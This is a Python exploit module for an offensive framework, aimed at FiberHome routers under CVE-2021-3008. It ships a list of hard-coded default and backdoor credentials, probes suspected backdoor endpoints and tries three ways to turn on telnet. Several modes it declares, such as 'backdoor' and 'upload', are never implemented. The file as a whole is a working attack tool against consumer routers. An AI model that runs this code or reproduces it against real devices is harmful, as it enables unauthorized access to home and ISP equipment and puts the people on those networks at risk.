#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FiberHome Router Exploit - Enhanced Version
CVE-2021-3008 with additional backdoors
"""

import requests
import socket
import time
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "FiberHome Enhanced Exploit",
    "description": "Enhanced FiberHome exploits with multiple backdoors",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "High",
    "references": [
        "CVE-2021-3008",
        "FiberHome Backdoors"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "adminpldt"},
    "PASSWORD": {"description": "Password", "required": False, "default": "6GFJdY4aAuUKJjdtSn7dC2x"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "enable", "connect", "upload", "backdoor"]
    },
    "CMD": {"description": "Command", "required": False, "default": "id"},
    "LHOST": {"description": "Listener IP", "required": False, "default": "10.0.0.1"},
    "LPORT": {"description": "Listener port", "required": False, "default": "4444"},
}

# Enhanced FiberHome Credentials
FIBERHOME_CREDS = [
    ("adminpldt", "6GFJdY4aAuUKJjdtSn7dC2x"),
    ("gepon", "gepon"),
    ("rdsadmin", "adu#"),
    ("admin", "admin"),
    ("user", "user"),
    ("root", "root"),
    ("support", "support"),
    ("telecomadmin", "admintelecom"),
]

class FiberHomeEnhancedExploit:
    def __init__(self, target, port=80, proto="http", username="adminpldt", password="6GFJdY4aAuUKJjdtSn7dC2x"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Referer': f'{self.base_url}/'
        })
    
    def detect_device(self):
        """Enhanced FiberHome detection"""
        console.print("\n[bold yellow]=== FiberHome ENHANCED DETECTION ===[/bold yellow]")
        
        try:
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            fiberhome_detected = False
            if "fiberhome" in html_content or "an5506" in html_content or "ont" in html_content:
                fiberhome_detected = True
                console.print("[green]✓ FiberHome router detected[/green]")
            
            # Test multiple backdoors
            backdoors = self.test_backdoors()
            
            return {
                'is_fiberhome': fiberhome_detected,
                'backdoors_found': backdoors
            }
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_fiberhome': False}
    
    def test_backdoors(self):
        """Test multiple FiberHome backdoors"""
        console.print("[bold yellow][*] Testing FiberHome backdoors...[/bold yellow]")
        
        backdoors = []
        
        # Multiple backdoor endpoints
        endpoints = [
            "/fh", "/zte", "/backdoor", "/debug",
            "/api/device/telnet", "/cgi-bin/telnet",
            "/romfile.cfg", "/config.bin"
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                r = self.session.get(url, timeout=5)
                if r.status_code != 404:
                    backdoors.append(endpoint)
                    console.print(f"[green]✓ Backdoor found: {endpoint}[/green]")
            except:
                continue
        
        return backdoors
    
    def enable_telnet_enhanced(self):
        """Enhanced telnet enable with multiple methods"""
        console.print("[bold yellow][*] Enabling telnet (enhanced)...[/bold yellow]")
        
        methods = [
            self._enable_via_fh,
            self._enable_via_zte,
            self._enable_via_api
        ]
        
        for method in methods:
            if method():
                return True
        
        return False
    
    def _enable_via_fh(self):
        """Enable via /fh endpoint"""
        try:
            url = f"{self.base_url}/fh"
            data = {"username": self.username, "password": self.password}
            r = self.session.post(url, data=data, timeout=10)
            
            if r.status_code == 200:
                telnet_url = f"{self.base_url}/telnet?Enable=0"
                r = self.session.get(telnet_url, timeout=10)
                return r.status_code == 200
        except:
            return False
    
    def _enable_via_zte(self):
        """Enable via ZTE backdoor"""
        try:
            url = f"{self.base_url}/zte"
            data = {"username": "admin", "password": "admin"}
            r = self.session.post(url, data=data, timeout=10)
            return r.status_code == 200
        except:
            return False
    
    def _enable_via_api(self):
        """Enable via API endpoint"""
        try:
            url = f"{self.base_url}/api/device/telnet"
            data = {"enable": "1"}
            r = self.session.post(url, data=data, timeout=10)
            return r.status_code == 200
        except:
            return False

def run(session, options):
    """Enhanced FiberHome exploit function"""
    console.print(Panel("FiberHome Enhanced Exploit", style="bold green"))
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "adminpldt")
    password = options.get("PASSWORD", "6GFJdY4aAuUKJjdtSn7dC2x")
    mode = options.get("MODE", "detect")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    
    try:
        exploit = FiberHomeEnhancedExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_fiberhome']:
                console.print("[green]✓ FiberHome router detected[/green]")
                console.print(f"[cyan]Backdoors found: {len(result['backdoors_found'])}[/cyan]")
            else:
                console.print("[red]✗ Not a FiberHome router[/red]")
        
        elif mode == "enable":
            if exploit.enable_telnet_enhanced():
                console.print("[green]✓ Telnet enabled via multiple methods[/green]")
            else:
                console.print("[red]✗ Telnet enable failed[/red]")
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/red]")
        return False
